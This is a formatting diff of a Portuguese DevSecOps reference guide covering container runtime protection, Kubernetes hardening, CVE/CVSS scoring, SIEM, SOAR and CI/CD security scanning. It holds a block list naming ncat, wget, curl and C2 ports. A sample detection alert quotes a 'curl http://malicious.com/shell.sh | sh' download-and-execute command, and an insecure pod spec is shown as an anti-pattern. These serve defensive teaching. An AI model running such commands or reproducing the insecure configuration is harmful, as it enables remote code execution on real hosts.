     - ncat
     - wget
     - curl
-  
+
   # Network Protection
   blocked_outbound_ports:
-    - 4444  # Metasploit default
-    - 6667  # IRC
-  
+    - 4444 # Metasploit default
+    - 6667 # IRC
+
   blocked_ips:
-    - 185.220.101.0/24  # Known C2 range
-  
+    - 185.220.101.0/24 # Known C2 range
+
   # Drift Prevention
   allowed_processes:
     - /app/main
     - /usr/bin/java
-  
-  drift_prevention: true  # Block processes not in image
+
+  drift_prevention: true # Block processes not in image
 ```
 
 **Alert example:**
@@ -1178,7 +1090,7 @@ spec:
   "severity": "high",
   "timestamp": "2024-02-10T15:34:22Z",
   "type": "malicious_process",
-  
+
   "resource": {
     "type": "container",
     "name": "web-app-7f8c9d-xyz",
@@ -1186,7 +1098,7 @@ spec:
     "namespace": "production",
     "node": "ip-10-0-1-50.ec2.internal"
   },
-  
+
   "event": {
     "description": "Unauthorized process execution detected",
     "process": "/bin/bash -c 'curl http://malicious.com/shell.sh | sh'",
@@ -1194,7 +1106,7 @@ spec:
     "user": "root",
     "action": "BLOCKED"
   },
-  
+
   "threat_intel": {
     "indicator": "malicious.com",
     "type": "domain",
@@ -1202,7 +1114,7 @@ spec:
     "first_seen": "2024-01-15",
     "confidence": "high"
   },
-  
+
   "recommendation": "Investigate container compromise. Check application logs for initial access vector."
 }
 ```
@@ -1220,7 +1132,7 @@ graph LR
     A[2015: CSPM] --> B[2018: CWPP]
     B --> C[2020: CIEM]
     C --> D[2022: CNAPP]
-    
+
     D --> E[Unified Platform]
     E --> F[Single Pane of Glass]
 ```
@@ -1273,16 +1185,16 @@ Risk Score: 95/100 (CRITICAL)
 Attack Path:
   1. Public S3 bucket contains AWS credentials
      └─ s3://company-public/config/aws-keys.json
-     
+
   2. Credentials belong to EC2 instance role
      └─ IAM Role: prod-web-app-role
-     
+
   3. Role has excessive permissions
      └─ Policy: AdministratorAccess (!!!!)
-     
+
   4. Role can assume Database Admin role
      └─ sts:AssumeRole on prod-db-admin-role
-     
+
   5. Database Admin has RDS access
      └─ Full access to prod-customer-db
 
@@ -1295,11 +1207,11 @@ Choke Points (Fix Priority):
   1. Remove public access from S3 bucket
      Impact: Blocks 100% of attack paths
      Effort: 5 minutes
-  
+
   2. Rotate exposed credentials
      Impact: Invalidates leaked keys
      Effort: 15 minutes
-  
+
   3. Apply least privilege to IAM role
      Impact: Limits lateral movement
      Effort: 2 hours
@@ -1318,17 +1230,17 @@ Control Plane Security:
   - API Server authentication/authorization
   - etcd encryption (secrets at rest)
   - Admission controllers (policy enforcement)
-  
+
 Node Security:
   - Kubelet authorization
   - Container runtime security (containerd/CRI-O)
   - Node OS hardening
-  
+
 Network Security:
   - Network Policies (firewalling)
   - Service Mesh (mTLS - Istio, Linkerd)
   - Ingress/Egress controls
-  
+
 Workload Security:
   - Pod Security Standards
   - Security Context (runAsNonRoot, readOnlyRootFilesystem)
@@ -1339,8 +1251,7 @@ Workload Security:
 **Principais vulnerabilidades K8s:**
 
 ```yaml
-Misconfigurations (90% dos problemas):
-  ✗ Privileged containers
+Misconfigurations (90% dos problemas): ✗ Privileged containers
   ✗ Containers running as root
   ✗ Host network/PID/IPC sharing
   ✗ Writable root filesystem
@@ -1348,8 +1259,7 @@ Misconfigurations (90% dos problemas):
   ✗ Secrets in environment variables
   ✗ Insecure API server (no auth)
 
-Supply Chain:
-  ✗ Untrusted container images
+Supply Chain: ✗ Untrusted container images
   ✗ Vulnerable base images (Alpine, Ubuntu)
   ✗ No image signing/verification
   ✗ Public registries without scan
@@ -1365,21 +1275,20 @@ metadata:
   name: insecure-app
 spec:
   containers:
-  - name: app
-    image: myapp:latest  # No tag pinning
-    securityContext:
-      privileged: true   # ❌ Full host access
-      runAsUser: 0       # ❌ Running as root
-    volumeMounts:
-    - name: docker-sock
-      mountPath: /var/run/docker.sock  # ❌ Docker socket exposed
+    - name: app
+      image: myapp:latest # No tag pinning
+      securityContext:
+        privileged: true # ❌ Full host access
+        runAsUser: 0 # ❌ Running as root
+      volumeMounts:
+        - name: docker-sock
+          mountPath: /var/run/docker.sock # ❌ Docker socket exposed
   volumes:
-  - name: docker-sock
-    hostPath:
-      path: /var/run/docker.sock
+    - name: docker-sock
+      hostPath:
+        path: /var/run/docker.sock
 
 ---
-
 # ✅ SECURE POD
 apiVersion: v1
 kind: Pod
@@ -1392,52 +1301,52 @@ spec:
     fsGroup: 2000
     seccompProfile:
       type: RuntimeDefault
-  
+
   containers:
-  - name: app
-    image: myapp@sha256:a3f7c8e9...  # ✅ Digest pinning
-    
-    securityContext:
-      allowPrivilegeEscalation: false
-      readOnlyRootFilesystem: true
-      runAsNonRoot: true
-      capabilities:
-        drop:
-          - ALL
-        add:
-          - NET_BIND_SERVICE
-    
-    resources:
-      limits:
-        cpu: "1"
-        memory: "512Mi"
-      requests:
-        cpu: "100m"
-        memory: "128Mi"
-    
-    volumeMounts:
-    - name: tmp
-      mountPath: /tmp
-    - name: cache
-      mountPath: /app/cache
-  
+    - name: app
+      image: myapp@sha256:a3f7c8e9... # ✅ Digest pinning
+
+      securityContext:
+        allowPrivilegeEscalation: false
+        readOnlyRootFilesystem: true
+        runAsNonRoot: true
+        capabilities:
+          drop:
+            - ALL
+          add:
+            - NET_BIND_SERVICE
+
+      resources:
+        limits:
+          cpu: "1"
+          memory: "512Mi"
+        requests:
+          cpu: "100m"
+          memory: "128Mi"
+
+      volumeMounts:
+        - name: tmp
+          mountPath: /tmp
+        - name: cache
+          mountPath: /app/cache
+
   volumes:
-  - name: tmp
-    emptyDir: {}
-  - name: cache
-    emptyDir: {}
+    - name: tmp
+      emptyDir: {}
+    - name: cache
+      emptyDir: {}
 ```
 
 **Kubernetes Security Tools:**
 
-|Categoria|Ferramenta|Uso|
-|---|---|---|
-|**Policy Enforcement**|OPA/Gatekeeper, Kyverno|Admission control|
-|**Image Scanning**|Trivy, Clair, Anchore|Vulnerabilidades em imagens|
-|**Runtime Security**|Falco, Aqua, Sysdig|Threat detection|
-|**Network Security**|Calico, Cilium|Network policies|
-|**Compliance**|kube-bench, kube-hunter|CIS benchmark validation|
-|**Secrets Management**|Sealed Secrets, External Secrets|Avoid plaintext secrets|
+| Categoria              | Ferramenta                       | Uso                         |
+| ---------------------- | -------------------------------- | --------------------------- |
+| **Policy Enforcement** | OPA/Gatekeeper, Kyverno          | Admission control           |
+| **Image Scanning**     | Trivy, Clair, Anchore            | Vulnerabilidades em imagens |
+| **Runtime Security**   | Falco, Aqua, Sysdig              | Threat detection            |
+| **Network Security**   | Calico, Cilium                   | Network policies            |
+| **Compliance**         | kube-bench, kube-hunter          | CIS benchmark validation    |
+| **Secrets Management** | Sealed Secrets, External Secrets | Avoid plaintext secrets     |
 
 **Falco - Runtime Detection:**
 
@@ -1480,7 +1389,7 @@ CVE-2021-44228:
   Year: 2021 (descoberta)
   Number: 44228 (sequencial)
   Name: Log4Shell
-  
+
 Components:
   - CVE ID (identificador)
   - Description (descrição técnica)
@@ -1508,28 +1417,28 @@ CVE-2014-0160 (Heartbleed):
   Component: OpenSSL
   Impact: Memory disclosure (passwords, keys)
   Affected: 17% of all HTTPS servers
-  
+
 CVE-2017-5638 (Apache Struts):
   Component: Jakarta Multipart parser
   Impact: Remote Code Execution
   Famous Breach: Equifax (143M records)
-  
+
 CVE-2019-0708 (BlueKeep):
   Component: Windows RDP
   Impact: Wormable RCE (no auth)
   Affected: 1M+ internet-exposed systems
-  
+
 CVE-2021-44228 (Log4Shell):
   Component: Apache Log4j
   Impact: Remote Code Execution via JNDI
   Affected: 93% of Java enterprise apps
   CVSS: 10.0 (Critical)
-  
+
 CVE-2022-22965 (Spring4Shell):
   Component: Spring Framework
   Impact: Remote Code Execution
   CVSS: 9.8 (Critical)
-  
+
 CVE-2023-23397 (Outlook):
   Component: Microsoft Outlook
   Impact: NTLM hash leak
@@ -1548,14 +1457,14 @@ curl "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2021-44228" | j
   "sourceIdentifier": "security@apache.org",
   "published": "2021-12-10T10:15Z",
   "lastModified": "2023-11-07T03:42Z",
-  
+
   "vulnStatus": "Analyzed",
-  
+
   "descriptions": [{
     "lang": "en",
     "value": "Apache Log4j2 2.0-beta9 through 2.15.0 (excluding 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled."
   }],
-  
+
   "metrics": {
     "cvssMetricV31": [{
       "cvssData": {
@@ -1566,12 +1475,12 @@ curl "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2021-44228" | j
       }
     }]
   },
-  
+
   "weaknesses": [{
     "type": "CWE",
     "description": [{ "value": "CWE-502" }]  # Deserialization
   }],
-  
+
   "references": [
     { "url": "https://logging.apache.org/log4j/2.x/security.html" },
     { "url": "https://www.lunasec.io/docs/blog/log4j-zero-day/" }
@@ -1589,30 +1498,30 @@ curl "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2021-44228" | j
 
 ```yaml
 Base Metrics (Características intrínsecas):
-  
+
   Attack Vector (AV):
     - Network (N): Remotely exploitable
     - Adjacent (A): Same network segment
     - Local (L): Local access required
     - Physical (P): Physical access required
-  
+
   Attack Complexity (AC):
     - Low (L): No special conditions
     - High (H): Requires specific conditions
-  
+
   Privileges Required (PR):
     - None (N): No authentication
     - Low (L): Basic user privileges
     - High (H): Admin privileges required
-  
+
   User Interaction (UI):
     - None (N): Fully automated
     - Required (R): User action needed
-  
+
   Scope (S):
     - Unchanged (U): Same security scope
     - Changed (C): Affects other components
-  
+
   Impact Metrics:
     - Confidentiality (C): Data disclosure
     - Integrity (I): Data modification
@@ -1627,8 +1536,7 @@ Vulnerability: SQL Injection in Web App
 
 Vector String: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
 
-Breakdown:
-  AV:N - Network (exploitable remotely via HTTP)
+Breakdown: AV:N - Network (exploitable remotely via HTTP)
   AC:L - Low complexity (simple SQL injection)
   PR:N - No privileges (unauthenticated)
   UI:N - No user interaction (automated)
@@ -1639,8 +1547,7 @@ Breakdown:
 
 Base Score: 9.8 (CRITICAL)
 
-Severity Ratings:
-  0.0       = None
+Severity Ratings: 0.0       = None
   0.1-3.9   = Low
   4.0-6.9   = Medium
   7.0-8.9   = High
@@ -1682,12 +1589,12 @@ Example:
 Modified Base Metrics:
   - Adjust based on YOUR environment
   - Example: SQL Injection in internal-only app
-    
+
     MAV:A (Adjacent - not internet-facing)
     MC:L (Low confidentiality - test data only)
     MI:L (Low integrity - non-critical)
     MA:N (None availability - redundant system)
-    
+
     Environmental Score: 4.2 (MEDIUM) vs Base 9.8 (CRITICAL)
 
 Security Requirements:
@@ -1718,18 +1625,18 @@ CWE (Category/Type):
 
 **Top 25 CWEs (2023):**
 
-|Rank|CWE|Nome|Exemplos|
-|---|---|---|---|
-|1|CWE-79|Cross-site Scripting (XSS)|Reflected/Stored/DOM XSS|
-|2|CWE-89|SQL Injection|SQLi, Blind SQLi|
-|3|CWE-20|Improper Input Validation|Command injection, path traversal|
-|4|CWE-78|OS Command Injection|Shell injection|
-|5|CWE-787|Out-of-bounds Write|Buffer overflow|
-|6|CWE-22|Path Traversal|Directory traversal|
-|7|CWE-352|CSRF|Cross-Site Request Forgery|
-|8|CWE-434|Unrestricted File Upload|Malicious file upload|
-|9|CWE-862|Missing Authorization|Broken access control|
-|10|CWE-476|NULL Pointer Dereference|Crashes, DoS|
+| Rank | CWE     | Nome                       | Exemplos                          |
+| ---- | ------- | -------------------------- | --------------------------------- |
+| 1    | CWE-79  | Cross-site Scripting (XSS) | Reflected/Stored/DOM XSS          |
+| 2    | CWE-89  | SQL Injection              | SQLi, Blind SQLi                  |
+| 3    | CWE-20  | Improper Input Validation  | Command injection, path traversal |
+| 4    | CWE-78  | OS Command Injection       | Shell injection                   |
+| 5    | CWE-787 | Out-of-bounds Write        | Buffer overflow                   |
+| 6    | CWE-22  | Path Traversal             | Directory traversal               |
+| 7    | CWE-352 | CSRF                       | Cross-Site Request Forgery        |
+| 8    | CWE-434 | Unrestricted File Upload   | Malicious file upload             |
+| 9    | CWE-862 | Missing Authorization      | Broken access control             |
+| 10   | CWE-476 | NULL Pointer Dereference   | Crashes, DoS                      |
 
 **CWE Hierarchy:**
 
@@ -1754,7 +1661,7 @@ CWE-664: Improper Control of a Resource
 CVE-2021-44228 (Log4Shell):
   Primary CWE: CWE-502 (Deserialization of Untrusted Data)
   Secondary: CWE-20 (Improper Input Validation)
-  
+
 CVE-2022-22965 (Spring4Shell):
   Primary CWE: CWE-94 (Code Injection)
   Secondary: CWE-913 (Improper Control of Dynamically-Managed Code Resources)
@@ -1813,7 +1720,7 @@ graph LR
     D --> E[Patch Developed]
     E --> F[Patch Released]
     F --> G[Users Apply Patch]
-    
+
     B -.->|0-day Window| F
 ```
 
@@ -1825,7 +1732,7 @@ Zero-Day:
   - Sem patch disponível
   - Altamente valiosos (black market: $100k-$2M)
   - Usados em ataques direcionados (APTs)
-  
+
 N-Day (1-day, 2-day, etc):
   - Vendor conhece e divulgou
   - Patch disponível
@@ -1861,20 +1768,17 @@ Log4Shell (CVE-2021-44228):
 **Proteção contra 0-days:**
 
 ```yaml
-Preventive (Antes do ataque):
-  ✓ Virtual Patching (WAF, RASP)
+Preventive (Antes do ataque): ✓ Virtual Patching (WAF, RASP)
   ✓ Exploit mitigation (ASLR, DEP, CFG)
   ✓ Least privilege (limita impacto)
   ✓ Network segmentation
 
-Detective (Durante/Após):
-  ✓ EDR/XDR (behavioral analysis)
+Detective (Durante/Após): ✓ EDR/XDR (behavioral analysis)
   ✓ SIEM correlation
   ✓ Threat intelligence (IOCs)
   ✓ Honeypots
 
-Responsive:
-  ✓ Incident response plan
+Responsive: ✓ Incident response plan
   ✓ Forensics capability
   ✓ Backup & recovery
 ```
@@ -1919,14 +1823,14 @@ Response:
 
 **Ferramentas SIEM:**
 
-|Ferramenta|Tipo|Destaque|
-|---|---|---|
-|**Splunk Enterprise**|Comercial|Líder de mercado, search poderoso|
-|**Elastic (ELK)**|Open-Source|Elasticsearch + Logstash + Kibana|
-|**Microsoft Sentinel**|Cloud|Integração Azure/M365|
-|**IBM QRadar**|Comercial|Compliance (healthcare, finance)|
-|**LogRhythm**|Comercial|SOAR integrado|
-|**Sumo Logic**|Cloud|Cloud-native|
+| Ferramenta             | Tipo        | Destaque                          |
+| ---------------------- | ----------- | --------------------------------- |
+| **Splunk Enterprise**  | Comercial   | Líder de mercado, search poderoso |
+| **Elastic (ELK)**      | Open-Source | Elasticsearch + Logstash + Kibana |
+| **Microsoft Sentinel** | Cloud       | Integração Azure/M365             |
+| **IBM QRadar**         | Comercial   | Compliance (healthcare, finance)  |
+| **LogRhythm**          | Comercial   | SOAR integrado                    |
+| **Sumo Logic**         | Cloud       | Cloud-native                      |
 
 **Exemplo de correlação (Splunk):**
 
@@ -2026,13 +1930,13 @@ Steps:
        - Parse email headers (sender IP, domain)
        - Extract URLs and attachments
        - Calculate file hashes (SHA-256)
-  
+
   2. Enrich IOCs with Threat Intel
      Integrations:
        - VirusTotal (check hashes)
        - AbuseIPDB (check sender IP)
        - URLScan.io (scan URLs)
-  
+
   3. Determine Severity
      Logic:
        IF VirusTotal detections > 5 OR
@@ -2040,32 +1944,32 @@ Steps:
           URL leads to known phishing kit
        THEN severity = HIGH
        ELSE severity = MEDIUM
-  
+
   4. Containment (if HIGH severity)
      Actions:
        - Quarantine email (Exchange API)
        - Block sender domain (Email Gateway)
        - Block URLs (Proxy/Firewall)
        - Search for similar emails (delete all)
-  
+
   5. User Actions
      Actions:
        - Reset password (if clicked link)
        - Revoke active sessions
        - Enable MFA (if not already)
-  
+
   6. Investigation
      Actions:
        - Check EDR for malware (if attachment opened)
        - Review proxy logs (if URL visited)
        - Search SIEM for anomalous activity
-  
+
   7. Documentation
      Actions:
        - Create incident ticket (ServiceNow)
        - Update threat intel platform
        - Send report to security team
-  
+
   8. Notification
      Actions:
        - Email user (education)
@@ -2181,13 +2085,13 @@ Technical Threat Intelligence:
 
 **Threat Intel Platforms:**
 
-|Plataforma|Tipo|Uso|
-|---|---|---|
-|**OpenCTI**|Open-Source|STIX/TAXII, graph database|
-|**MISP**|Open-Source|Sharing platform (communities)|
-|**ThreatConnect**|Comercial|Enterprise TIP|
-|**Anomali**|Comercial|Threat intel aggregation|
-|**RecordedFuture**|Comercial|AI-powered intel|
+| Plataforma         | Tipo        | Uso                            |
+| ------------------ | ----------- | ------------------------------ |
+| **OpenCTI**        | Open-Source | STIX/TAXII, graph database     |
+| **MISP**           | Open-Source | Sharing platform (communities) |
+| **ThreatConnect**  | Comercial   | Enterprise TIP                 |
+| **Anomali**        | Comercial   | Threat intel aggregation       |
+| **RecordedFuture** | Comercial   | AI-powered intel               |
 
 **Exemplo: OpenCTI Workflow**
 
@@ -2243,39 +2147,39 @@ THEN alert("APT28 C2 communication detected")
 
 ```yaml
 1. Source (Code Commit):
-   - Developer: git push
-   - Trigger: Webhook (GitHub, GitLab)
+  - Developer: git push
+  - Trigger: Webhook (GitHub, GitLab)
 
 2. Build:
-   - Compile code
-   - Dependency resolution
-   - Security: SCA (check dependencies)
+  - Compile code
+  - Dependency resolution
+  - Security: SCA (check dependencies)
 
 3. Test:
-   - Unit tests
-   - Integration tests
-   - Security: SAST (scan source code)
+  - Unit tests
+  - Integration tests
+  - Security: SAST (scan source code)
 
 4. Package:
-   - Create artifacts (Docker image, JAR, etc)
-   - Security: Image scanning (Trivy, Clair)
+  - Create artifacts (Docker image, JAR, etc)
+  - Security: Image scanning (Trivy, Clair)
 
 5. Deploy (Staging):
-   - Deploy to staging environment
-   - Security: DAST (ZAP scan)
+  - Deploy to staging environment
+  - Security: DAST (ZAP scan)
 
 6. Verify:
-   - Smoke tests
-   - Performance tests
-   - Security: IAST (if agent installed)
+  - Smoke tests
+  - Performance tests
+  - Security: IAST (if agent installed)
 
 7. Deploy (Production):
-   - Blue-Green or Canary deployment
-   - Security: RASP enabled
+  - Blue-Green or Canary deployment
+  - Security: RASP enabled
 
 8. Monitor:
-   - Application monitoring (APM)
-   - Security: Runtime protection, SIEM
+  - Application monitoring (APM)
+  - Security: Runtime protection, SIEM
 ```
 
 **Security Gates (DevSecOps):**
@@ -2327,60 +2231,60 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      
+
       - name: SonarQube Scan
         uses: sonarsource/sonarqube-scan-action@master
         env:
           SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
-      
+
       - name: Quality Gate
         uses: sonarsource/sonarqube-quality-gate-action@master
         timeout-minutes: 5
         env:
           SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
-  
+
   security-sca:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      
+
       - name: Snyk SCA Scan
         uses: snyk/actions/node@master
         env:
           SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
         with:
           args: --severity-threshold=high
-  
+
   security-secrets:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
         with:
           fetch-depth: 0
-      
+
       - name: TruffleHog Secrets Scan
         uses: trufflesecurity/trufflehog@main
         with:
           path: ./
           base: ${{ github.event.repository.default_branch }}
           head: HEAD
-  
+
   build:
     needs: [security-sast, security-sca, security-secrets]
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      
+
       - name: Build Docker Image
         run: docker build -t myapp:${{ github.sha }} .
-      
+
       - name: Trivy Image Scan
         uses: aquasecurity/trivy-action@master
         with:
           image-ref: myapp:${{ github.sha }}
-          severity: 'CRITICAL,HIGH'
-          exit-code: 1  # Fail build on vulnerabilities
-  
+          severity: "CRITICAL,HIGH"
+          exit-code: 1 # Fail build on vulnerabilities
+
   deploy:
     needs: build
     if: github.ref == 'refs/heads/main'
@@ -2390,7 +2294,7 @@ jobs:
         run: |
           kubectl set image deployment/myapp \
             myapp=myapp:${{ github.sha }}
-      
+
       - name: DAST Scan (async)
         run: |
           # Trigger ZAP scan (don't block deployment)
@@ -2544,18 +2448,18 @@ OWASP Cheat Sheets:
 
 **OWASP Top 10 (2021):**
 
-|Rank|Nome|Descrição|
-|---|---|---|
-|**A01**|**Broken Access Control**|Bypass de autorização, acesso não autorizado|
-|**A02**|**Cryptographic Failures**|Dados sensíveis sem criptografia|
-|**A03**|**Injection**|SQL, NoSQL, Command, LDAP injection|
-|**A04**|**Insecure Design**|Falhas de arquitetura/threat modeling|
-|**A05**|**Security Misconfiguration**|Defaults inseguros, configs expostas|
-|**A06**|**Vulnerable Components**|Dependências desatualizadas/vulneráveis|
-|**A07**|**Authentication Failures**|Broken auth, session management|
-|**A08**|**Software and Data Integrity**|Deserialization, unsigned code|
-|**A09**|**Logging & Monitoring**|Falta de logs, detecção tardia|
-|**A10**|**SSRF**|Server-Side Request Forgery|
+| Rank    | Nome                            | Descrição                                    |
+| ------- | ------------------------------- | -------------------------------------------- |
+| **A01** | **Broken Access Control**       | Bypass de autorização, acesso não autorizado |
+| **A02** | **Cryptographic Failures**      | Dados sensíveis sem criptografia             |
+| **A03** | **Injection**                   | SQL, NoSQL, Command, LDAP injection          |
+| **A04** | **Insecure Design**             | Falhas de arquitetura/threat modeling        |
+| **A05** | **Security Misconfiguration**   | Defaults inseguros, configs expostas         |
+| **A06** | **Vulnerable Components**       | Dependências desatualizadas/vulneráveis      |
+| **A07** | **Authentication Failures**     | Broken auth, session management              |
+| **A08** | **Software and Data Integrity** | Deserialization, unsigned code               |
+| **A09** | **Logging & Monitoring**        | Falta de logs, detecção tardia               |
+| **A10** | **SSRF**                        | Server-Side Request Forgery                  |
 
 **Mudanças 2017 → 2021:**
 
@@ -2603,10 +2507,10 @@ MTTC (Mean Time to Contain):
 
 MTTR (Mean Time to Remediate):
   - Tempo até corrigir completamente
-  - Best practice: 
-    - Critical: 7 days
-    - High: 30 days
-    - Medium: 90 days
+  - Best practice:
+      - Critical: 7 days
+      - High: 30 days
+      - Medium: 90 days
 
 MTTR (Mean Time to Recover):
   - Tempo até restaurar operação normal
@@ -2623,18 +2527,18 @@ Example:
   Incident 1: Detected 2024-01-15, Fixed 2024-01-22 = 7 days
   Incident 2: Detected 2024-01-20, Fixed 2024-01-25 = 5 days
   Incident 3: Detected 2024-02-01, Fixed 2024-02-08 = 7 days
-  
+
   MTTR = (7 + 5 + 7) / 3 = 6.3 days
 ```
 
 **Benchmarks por Severidade:**
 
-|Severity|MTTR Target|Industry Average|Best-in-Class|
-|---|---|---|---|
-|**Critical**|7 days|45 days|2 days|
-|**High**|30 days|90 days|14 days|
-|**Medium**|90 days|180 days|60 days|
-|**Low**|365 days|Never|120 days|
+| Severity     | MTTR Target | Industry Average | Best-in-Class |
+| ------------ | ----------- | ---------------- | ------------- |
+| **Critical** | 7 days      | 45 days          | 2 days        |
+| **High**     | 30 days     | 90 days          | 14 days       |
+| **Medium**   | 90 days     | 180 days         | 60 days       |
+| **Low**      | 365 days    | Never            | 120 days      |
 
 **Fatores que afetam MTTR:**
 
@@ -2664,44 +2568,44 @@ Tooling:
 
 ### AST Technologies Comparison
 
-|Aspecto|SAST|DAST|IAST|SCA|RASP|
-|---|---|---|---|---|---|
-|**Timing**|Desenvolvimento|Pós-deploy|Testes|Build|Runtime|
-|**Requires Running App**|❌ Não|✅ Sim|✅ Sim|❌ Não|✅ Sim|
-|**Source Code Access**|✅ Sim|❌ Não|✅ Sim|❌ Não|❌ Não|
-|**False Positive Rate**|🟡 Alto (30%)|🟢 Baixo (10%)|🟢 Muito Baixo (5%)|🟢 Baixo (10%)|🟢 Muito Baixo (1%)|
-|**Coverage**|🟢 100%|🔴 20-40%|🟡 60-80%|🟢 100% deps|🟡 Runtime only|
-|**Performance Impact**|🟢 Nenhum|🟡 Médio|🟡 Médio (10%)|🟢 Nenhum|🔴 Alto (15%)|
-|**Identifies Line of Code**|✅ Sim|❌ Não|✅ Sim|✅ Sim|⚠️ Parcial|
-|**Detects Runtime Issues**|❌ Não|✅ Sim|✅ Sim|❌ Não|✅ Sim|
-|**Setup Complexity**|🟢 Fácil|🟡 Médio|🔴 Difícil|🟢 Fácil|🔴 Difícil|
-|**Cost**|$$|$|$$$|$|$$$|
-|**Best For**|Early detection|Final validation|Accurate findings|Dependency risk|Production defense|
+| Aspecto                     | SAST            | DAST             | IAST                | SCA             | RASP                |
+| --------------------------- | --------------- | ---------------- | ------------------- | --------------- | ------------------- |
+| **Timing**                  | Desenvolvimento | Pós-deploy       | Testes              | Build           | Runtime             |
+| **Requires Running App**    | ❌ Não          | ✅ Sim           | ✅ Sim              | ❌ Não          | ✅ Sim              |
+| **Source Code Access**      | ✅ Sim          | ❌ Não           | ✅ Sim              | ❌ Não          | ❌ Não              |
+| **False Positive Rate**     | 🟡 Alto (30%)   | 🟢 Baixo (10%)   | 🟢 Muito Baixo (5%) | 🟢 Baixo (10%)  | 🟢 Muito Baixo (1%) |
+| **Coverage**                | 🟢 100%         | 🔴 20-40%        | 🟡 60-80%           | 🟢 100% deps    | 🟡 Runtime only     |
+| **Performance Impact**      | 🟢 Nenhum       | 🟡 Médio         | 🟡 Médio (10%)      | 🟢 Nenhum       | 🔴 Alto (15%)       |
+| **Identifies Line of Code** | ✅ Sim          | ❌ Não           | ✅ Sim              | ✅ Sim          | ⚠️ Parcial          |
+| **Detects Runtime Issues**  | ❌ Não          | ✅ Sim           | ✅ Sim              | ❌ Não          | ✅ Sim              |
+| **Setup Complexity**        | 🟢 Fácil        | 🟡 Médio         | 🔴 Difícil          | 🟢 Fácil        | 🔴 Difícil          |
+| **Cost**                    | $$              | $                | $$$                 | $               | $$$                 |
+| **Best For**                | Early detection | Final validation | Accurate findings   | Dependency risk | Production defense  |
 
 ---
 
 ### Cloud Security Tools Comparison
 
-|Ferramenta|CSPM|CWPP|CIEM|KSPM|CNAPP|
-|---|---|---|---|---|---|
-|**Prisma Cloud**|✅|✅|✅|✅|✅|
-|**Wiz**|✅|✅|✅|✅|✅|
-|**Orca**|✅|✅|✅|✅|✅|
-|**Aqua**|⚠️|✅|❌|✅|⚠️|
-|**Sysdig**|⚠️|✅|❌|✅|⚠️|
-|**Lacework**|✅|✅|✅|⚠️|✅|
-|**AWS Security Hub**|✅|⚠️|⚠️|❌|❌|
+| Ferramenta           | CSPM | CWPP | CIEM | KSPM | CNAPP |
+| -------------------- | ---- | ---- | ---- | ---- | ----- |
+| **Prisma Cloud**     | ✅   | ✅   | ✅   | ✅   | ✅    |
+| **Wiz**              | ✅   | ✅   | ✅   | ✅   | ✅    |
+| **Orca**             | ✅   | ✅   | ✅   | ✅   | ✅    |
+| **Aqua**             | ⚠️   | ✅   | ❌   | ✅   | ⚠️    |
+| **Sysdig**           | ⚠️   | ✅   | ❌   | ✅   | ⚠️    |
+| **Lacework**         | ✅   | ✅   | ✅   | ⚠️   | ✅    |
+| **AWS Security Hub** | ✅   | ⚠️   | ⚠️   | ❌   | ❌    |
 
 ---
 
 ### Vulnerability Severity SLA
 
-|Severity|CVSS Score|Examples|MTTR Target|Scan Frequency|
-|---|---|---|---|---|
-|**Critical**|9.0-10.0|Log4Shell, BlueKeep|7 days|Daily|
-|**High**|7.0-8.9|XSS, SQLi|30 days|Weekly|
-|**Medium**|4.0-6.9|Information Disclosure|90 days|Monthly|
-|**Low**|0.1-3.9|Minor misconfigs|365 days|Quarterly|
+| Severity     | CVSS Score | Examples               | MTTR Target | Scan Frequency |
+| ------------ | ---------- | ---------------------- | ----------- | -------------- |
+| **Critical** | 9.0-10.0   | Log4Shell, BlueKeep    | 7 days      | Daily          |
+| **High**     | 7.0-8.9    | XSS, SQLi              | 30 days     | Weekly         |
+| **Medium**   | 4.0-6.9    | Information Disclosure | 90 days     | Monthly        |
+| **Low**      | 0.1-3.9    | Minor misconfigs       | 365 days    | Quarterly      |
 
 ---
 
@@ -2730,9 +2634,9 @@ Tooling:
 
 ## 📝 Changelog
 
-|Data|Versão|Alteração|
-|---|---|---|
-|2024-02-10|1.0|Documento inicial criado|
+| Data       | Versão | Alteração                |
+| ---------- | ------ | ------------------------ |
+| 2024-02-10 | 1.0    | Documento inicial criado |
 
 ---
 
@@ -2768,9 +2672,4 @@ DevSecOps
    ├─ Pipeline (CI/CD)
    ├─ Inventory (SBOM)
    └─ Metrics (MTTR)
-```
-
-```
-
-Este documento fornece uma referência completa e prática de todas as siglas e conceitos fundamentais de DevSecOps, com exemplos reais, comparações e melhores práticas. Use como guia de consulta rápida durante estudos ou trabalho operacional! 🔒
 ```
